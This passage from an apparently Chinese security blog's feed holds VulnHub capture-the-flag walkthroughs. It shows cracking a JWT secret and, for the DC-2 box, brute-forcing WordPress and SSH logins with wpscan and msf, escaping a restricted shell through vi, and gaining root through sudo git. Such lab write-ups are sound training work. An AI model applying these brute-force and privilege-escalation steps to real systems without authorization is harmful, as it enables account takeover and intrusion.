class="meta">o6</span>Ft<span class="number">9</span>cwg</span><br></pre></td></tr></table></figure><p>JWT在线解析 <a href="https://jwt.io/#debugger-io">https://jwt.io/#debugger-io</a><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091431918.png"></p><p>前面两部分是base64编码,最后一部分需要秘钥</p><ul><li>使用工具爆破<br>项目地址 <a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c-jwt-cracker-master </span><br><span class="line">                                                                                                                                                                                                  </span><br><span class="line">apt-get install libssl-dev</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">./jwtcrack key</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091452825.png"></li></ul><p>等待几分钟爆出密码,根据最开始的提示应该是root密码</p><h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p>登录root<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091456953.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶机项目地址&lt;a href=&quot;https://www.vulnhub.com/entry/minu-1,235/&quot;&gt;https://www.vulnhub.com/entry/minu-1,235/&lt;/a&gt;&lt;br&gt;使用vm导入靶机需要关掉网卡2,再重新dhclinent&lt;/p&gt;
&lt;p&gt;靶机:172.16.17.144&lt;/p&gt;
&lt;p&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;目标&quot;&gt;&lt;a href=&quot;#目标&quot; class=&quot;headerlink&quot; title=&quot;目标&quot;&gt;&lt;/a&gt;目标&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="红队" scheme="https://syst1m.top/tags/%E7%BA%A2%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc2打靶</title>
    <link href="https://syst1m.top/2022/06/07/vulnhub-dc2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/07/vulnhub-dc2%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-07T11:35:24.000Z</published>
    <updated>2022-06-07T13:31:17.115Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub环境,项目地址<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>靶机:172.16.17.143<br>攻击机kali:172.16.17.140</p><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071953622.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>找到靶机ip<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071939781.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072051340.png"></p><p>打开跳转dc-2&#x2F;,502<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071940839.png"></p><p>抓包发现301永久跳转一个页面<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071952711.png"></p><p>添加一个解析<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072000538.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072000379.png"><br>拿到第一个flag,提示我们使用cewl来生成密码</p><h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072012702.png"><br>cewl使用 <a href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a></p><p>使用cewl生成字典<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072018340.png"></p><p>需要扫出登录点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072035043.png"><br>经典wordpress</p><p>掏出wpscan,枚举用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url  http://dc-2 -e u</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072041502.png"></p><p>将用户名写入txt,开始爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url  http://dc-2 -U name.txt -P pwd.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072044253.png"></p><p>登录jerry账号发现flag2<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072047333.png"><br>flag提示,如果wp没法利用就找别的方法,想到刚刚信息收集还有ssh,用这两个账号去试试</p><p>msf爆破ssh<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072057740.png"><br>最后使用tom用户成功登录</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>尝试之后发现权限很低,使用vi查看内容<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072100660.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072059691.png"><br>得到提示,尝试su,发现没有这个命令,查看一下当前用户的环境变量<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072103628.png"></p><p>使用vi尝试绕过,得到一个正常环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vi a.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置shell变量</span></span><br><span class="line">:shell = /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动shell</span></span><br><span class="line">:shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入环境变量</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072116628.png"></p><p>登录jerry,使用刚刚爆破出的密码,得到flag4.txt,没有提示<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072120697.png"></p><p>查看历史命令,发现有使用sudo git,也就是说git是有root权限的<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072129726.png"></p><p>git提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo git <span class="built_in">help</span> add</span><br><span class="line">末尾输入!/bin/bash</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">sudo git <span class="built_in">help</span> config</span><br><span class="line">末尾输入</span><br><span class="line">!<span class="string">&#x27;sh&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072127120.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072128530.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub环境,项目地址&lt;a href=&quot;https://www.vulnhub.com/entry/dc-2,311/&quot;&gt;https://www.vulnhub.com/entry/dc-2,311/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.143&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;目标&quot;&gt;&lt;a href=&quot;#目标&quot; class=&quot;headerlink&quot; title=&quot;目标&quot;&gt;&lt;/a&gt;目标&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206071953622.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
  </entry>
  
</feed>
